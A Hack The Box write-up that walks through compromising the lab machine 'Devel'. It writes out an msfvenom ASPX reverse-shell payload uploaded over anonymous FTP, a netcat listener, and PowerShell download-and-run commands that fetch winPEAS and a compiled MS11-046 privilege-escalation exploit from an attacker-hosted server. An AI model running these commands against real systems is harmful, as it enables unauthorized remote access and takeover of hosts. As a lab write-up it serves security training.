---
title: "Hack The Box - Devel"
date: 2022-06-16T09:48:08+05:30
draft: false
description: " Devel from HackTheBox is an retired machine which is vulnerable to MS11-046, which can be easily exploited with publicly available scripts and Metasploit "
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- Unrestricted File Upload
- IIS
- ASP
- Remote Code Execution
- CVE-ID-2011-1249
- AFD
- MS11-046
series:
- Pratical Ethical Hacking TCM
categories:
- Easy
- HackTheBox
- Windows
- Metasploit
- Public Exploit
libraries:

image: /images/hackthebox/devel/Devel.png 
---


Hi Hackers Welcome Back, Today we are going to look at Hack The Box Devel Machine.

{{< img src="/images/hackthebox/devel/Develpng.png" alt="image alt" width="450px"  position="center" >}}
## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Devel</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href="https://www.hackthebox.eu/home/users/profile/1"><img src="https://www.hackthebox.eu/badge/image/1" alt="" style="display: unset"></a>  </td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the service, which is vulnerable MS11-046 which can be easily exploited via publicly available scripts and Metasploit. 

## Mind Map 
{{< img src="/images/hackthebox/devel/mm.png" alt="image alt" width="1000px"  position="center" >}}

## Recon

Let’s scan target machine is any ports are open 

``` bash {hl_lines=[15, 8]}
┌─[atomloop@atomloop-virtualbox]─[~]
└──╼ $nmap -sC -sV -A 10.129.102.193 -oN initial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 13:35 IST
Nmap scan report for 10.129.102.193
Host is up (0.42s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.79 seconds
┌─[atomloop@atomloop-virtualbox]─[~]
```

``` bash
┌─[atom@atom-vmwarevirtualplatform]─[~]
└──╼ $nmap -Pn -p- -T4 10.129.102.193
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 15:25 IST
Stats: 0:09:49 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 78.62% done; ETC: 15:38 (0:02:40 remaining)
Nmap scan report for 10.129.102.193
Host is up (0.31s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 752.74 seconds
```
While we enumeration on port HTTP we can able to find the web server is an IIS and ASP as web technology 

{{< img src="/images/hackthebox/devel/1.png" alt="image alt" width="1000px"  position="center" >}}

## Enumeration 

Lets run Gobuster for finding hidden directory

``` bash  {hl_lines=[17]}
─[_]─[atom@atom-vmwarevirtualplatform]─[~]
└──_ $gobuster dir -u http://10.10.10.5 --wordlist /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/17 07:09:44 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 155] [--> http://10.10.10.5/aspnet_client/]
                                                                                      
===============================================================
2022/06/17 07:12:12 Finished
===============================================================

```

The result of gobuster shows some hidden directory, while we get into into says ```Access denied```

{{< img src="/images/hackthebox/devel/5.png" alt="image alt" width="1000px"  position="center" >}}

## Enumeration FTP

While enumeration on ```ftp```  ``` NMAP``` says that ```anonymous``` login allowed, 

``` Bash 
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──╼ $ftp 10.129.102.193
Connected to 10.129.102.193.
220 Microsoft FTP Service
Name (10.129.102.193:atom): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

we can able to see that three files which is ```aspnet_client``` ```iisstart.htm``` ```welcome.png``` out of this three file the file name ```aspnet_client ``` directory looks familiar because the same name directory on gobuster result, let's go to web and view source code 

``` HTML {hl_lines=[29]}
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#B3B3B3;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html>
```

## Exploiting 
On source code we can able to find ```Welcome.png``` image which is same image located on ```FTP``` now we can clear that the ```IIS SERVER ``` is hosted on t he ftp shared directory, we already logged in FTP with anonymous user, if we add anything to ftp directory, that added file reflect on web server. 

so lets write reverse shell payload in the aspx format, and put the payload into ftp directory, the reson we creating aspx format becouse we have already identified the web technology 

``` Bash
─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]                                           
└──_ $msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.5 LPORT=8989 -o wrs2.aspx             
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                   
[-] No arch selected, selecting arch: x86 from the payload                                               
No encoder specified, outputting raw payload                                                             
Payload size: 324 bytes                                                                                  
Final size of aspx file: 2720 bytes                                                                      
Saved as: wrs2.aspx
```

Put Payload into Web Server Directory which is FTP

``` Bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──╼ $ftp 10.129.102.193
Connected to 10.129.102.193.
220 Microsoft FTP Service
Name (10.129.102.193:atom): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put wrs2.aspx 
local: wrs2.aspx remote: cmdasp.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
38146 bytes sent in 0.00 secs (42.4987 MB/s)
ftp>
```
## Initial Foot Hold
{{< img src="/images/hackthebox/devel/6.png" alt="image alt" width="1000px"  position="center" >}}

``` Bash 
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──_ $nc -lvnp 8989
listening on [any] 8989 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.96.188] 49160
whoami
iis apppool\web
PS C:\windows\system32\inetsrv>

```

## Priviledge Escalation    
we got initial foot hold right now we are at low priviledge user lets we try to esclate Higher Priviledge  for that we use ```winPEASE.bat``` file host is on your attacker computer using python3 web server command 

``` Bash
┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──_ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.5 - - [16/Jun/2022 07:58:05] "GET /winPEASE.bat HTTP/1.1" 200 -
10.10.14.5 - - [16/Jun/2022 07:58:42] "GET / HTTP/1.1" 200 -
10.10.14.5 - - [16/Jun/2022 07:58:42] code 404, message File not found
10.10.14.5 - - [16/Jun/2022 07:58:42] "GET /favicon.ico HTTP/1.1" 404 -
```
Using Powershell command, get the winPEASE.bat file into the machine that we gained foot hold machine.

``` Powershell 
c:\windows\system32\inetsrv> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/winPEAS.bat', 'c:\Users\Public\Downloads\wp.bat')"
```

While running winPEAS.bat i could't find anything may be this is my first time using winPEASE, but i find the system information.

``` Powershell
C:\Users\Public>Downloadswp.bat                                                                                                                                                                                    
Downloadswp.bat                                                                                                                                                                                                    
                                                                                                                                                                                                                   
            ((,.,/((((((((((((((((((((/,  */                                                                                                                                                                       
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                                                                                                     
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                                                                                                                  
   ((((((((((((((((* *****,,,/########## .(* ,((((((                                                                                                                                                               
   (((((((((((/* ******************/####### .(. ((((((                                                                                                                                                             
   ((((((..******************/@@@@@/***/###### /((((((                                                                                                                                                             
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
   .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/
                       by carlospolop


/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.                                                                                                          
   Use it at your own networks and/or with the network owner's permission.
   
   ```
   ``` Powershell
   Host Name:                 DEVEL                                                                                                                                                                                   
OS Name:                   Microsoft Windows 7 Enterprise                                                                                                                                                          
OS Version:                6.1.7600 N/A Build 7600                                                                                                                                                                 
OS Manufacturer:           Microsoft Corporation                                                                                                                                                                   
OS Configuration:          Standalone Workstation                                                                                                                                                                  
OS Build Type:             Multiprocessor Free                                                                                                                                                                     
Registered Owner:          babis                                                                                                                                                                                   
Registered Organization:                                                                                                                                                                                           
Product ID:                55041-051-0948536-86302                                                                                                                                                                 
Original Install Date:     17/3/2017, 4:17:31                                                                                                                                                                      
System Boot Time:          15/6/2022, 4:14:48                                                                                                                                                                      
System Manufacturer:       VMware, Inc.                                                                                                                                                                            
System Model:              VMware Virtual Platform                                                                                                                                                                 
System Type:               X86-based PC                                                                                                                                                                            
Processor(s):              1 Processor(s) Installed.                                                                                                                                                               
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz                                                                                                                          
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                                                                                                               
Windows Directory:         C:\Windows                                                                                                                                                                              
System Directory:          C:\Windows\system32                                                                                                                                                                     
Boot Device:               \Device\HarddiskVolume1                                                                                                                                                                 
System Locale:             el;Greek                                                                                                                                                                                
Input Locale:              en-us;English (United States)                                                                                                                                                           
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul                                                                                                                                                 
Total Physical Memory:     3.071 MB                                                                                                                                                                                
Available Physical Memory: 2.430 MB                                                                                                                                                                                
Virtual Memory: Max Size:  6.141 MB                                                                                                                                                                                
Virtual Memory: Available: 5.498 MB                                                                                                                                                                                
Virtual Memory: In Use:    643 MB                                                                                                                                                                                  
Page File Location(s):     C:\pagefile.sys                                                                                                                                                                         
Domain:                    HTB                                                                                                                                                                                     
Logon Server:              N/A                                                                                                                                                                                     
Hotfix(s):                 N/A                                                                                                                                                                                     
Network Card(s):           1 NIC(s) Installed.                                                                                                                                                                     
                           [01]: vmxnet3 Ethernet Adapter                                                                                                                                                          
                                 Connection Name: Local Area Connection 3                                                                                                                                          
                                 DHCP Enabled:    No                                                                                                                                                               
                                 IP address(es)                                                                                                                                                                    
                                 [01]: 10.10.10.5                                                                                                                                                                  
                                 [02]: fe80::58c0:f1cf:abc6:bb9e                                                                                                                                                   
                                 [03]: dead:beef::4856:ad50:48be:7b98                                                                                                                                              
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e                                                                                                                                              
                                                                                                                                                                                                                   
No Instance(s) Available.
```
Using the information lets google, we can see that the exploits lets we use first exploit which is ```afd.sys```


{{< img src="/images/hackthebox/devel/7.png" alt="image alt" width="1000px"  position="center" >}}


While we get into the exploit we can able to see that exploit steps and ```EDB-ID``` which is searchsploit id 

``` c
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the invoking shell/process
#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
#   Exploit prerequisites:
#     - low privilege access to the target OS
#     - target OS not patched (KB2503665, or any other related
#       patch, if applicable, not installed - check "Related security
#       vulnerabilities/patches")
#   Exploit test notes:
#     - let the target OS boot properly (if applicable)
#     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
################################################################
```

{{< img src="/images/hackthebox/devel/8.png" alt="image alt" width="1000px"  position="center" >}}

Update **searchsploit** to ensure you have all the latest vulnerabilities.

```
searchsploit -u
```

Use the **-m** flag to look for the exploit **40564** and copy it to the current directory.

```
searchsploit -m 40564
```
Compile the ``` payload  ``` and convert it to ```.exe``` format 

If you don’t have mingw-w64 installed, install it.

``` code
apt-get updateapt-get install mingw-w64
```
```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──_ $i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──_ $ls
40564.c    cmdasp.asp   iisstart.html  shell.asp    wrs1.aspx  wrs.aspx
47176.cpp  cmdasp.aspx  MS11-046.exe   welcome.png  wrs2.aspx
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
```
Host the Payload 

```bash
┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/devil]
└──_ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Get payload using Powershell command 

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/MS11-046.exe', 'c:\Users\Public\Downloads\MS11-046.exe')"
```

```bash
Directory of C:\Users\Public\Downloads

16/06/2022  05:28     <DIR>          .
16/06/2022  05:28     <DIR>          ..
16/06/2022  05:28            250.562 MS11-046.exe
               1 File(s)        250.562 bytes
               2 Dir(s)   4.697.042.944 bytes free

C:\Users\Public\Downloads>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```

The payload works fine, We got NT Authority Priviledge, flags are located   

```bash
Directory of c:\Users\babis\Desktop

11/02/2022  04:54     <DIR>          .
11/02/2022  04:54     <DIR>          ..
16/06/2022  03:28                 34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.697.018.368 bytes free

c:\Users\babis\Desktop>type user.txt
type user.txt
3acb9fc4e****************

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\Administrator\Desktop

14/01/2021  12:42     <DIR>          .
14/01/2021  12:42     <DIR>          ..
16/06/2022  03:28                 34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.697.018.368 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
1d89b726**********************
c:\Users\Administrator\Desktop>
```
{{< notice success "we have successfully owned " >}}
See you on the next Blog, Happy hacking...
{{< /notice >}}